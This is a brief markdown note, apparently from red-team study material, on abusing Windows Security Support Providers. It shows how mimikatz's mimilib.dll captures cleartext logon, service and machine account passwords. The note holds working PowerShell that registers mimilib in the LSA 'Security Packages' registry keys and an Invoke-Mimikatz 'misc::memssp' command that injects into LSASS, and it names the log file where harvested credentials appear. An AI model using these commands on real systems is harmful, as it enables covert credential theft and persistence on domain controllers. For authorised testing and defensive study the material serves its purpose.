# Custom SSP (Security Support Provider)

* SSP is a DLL which provides ways for an application to obtain authenticated connection. some SPP packages by microsoft are
  * NTLM
  * kerberos
  * Wdigest
  * CredSSP

* mimikatz provides custom SSP - mimilib.dll. this SSP logs local logons, service account and machine account passwords in clear test on the target server.

* two ways to use
  * drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```powershell  
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
 
 * using mimikatz, inject into lsas (not stable with server 2016)
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

* all local logons on the DC are logged to C:\Windows\system32\kiwissp.log

Note: considered more risky and noisy to use in a real redteam assessment.
























